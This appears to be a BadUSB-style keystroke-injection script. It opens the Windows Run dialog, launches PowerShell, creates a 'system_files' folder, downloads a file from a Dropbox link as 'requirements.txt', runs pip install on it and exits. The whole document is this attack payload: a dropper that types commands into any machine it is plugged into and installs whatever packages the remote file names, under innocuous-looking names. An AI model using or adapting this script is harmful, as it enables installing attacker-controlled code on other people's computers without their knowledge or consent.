layout("US")
delay(500)
press("GUI r") // Open Run dialog
delay(500)
type("powershell") // Run PowerShell
press("ENTER")
delay(2000)
type("mkdir -p system_files") // Create working directory
press("ENTER")
delay(500)
type("cd system_files") // Go to working directory
press("ENTER")
delay(1000)
type('wget "https://www.dropbox.com/scl/fi/ue618fkyo44pt1t9jinyy/requirement.txt?rlkey=osjlfq97h8mc7zqh2fcyofxrs&st=itsvcs3n&dl=1" -O requirements.txt') // Download requirements.txt
press("ENTER")
delay(2500)
type("pip install -r requirements.txt") // Install requirements
press("Enter")
delay(5000)
type("exit")
delay(500)
press("ENTER")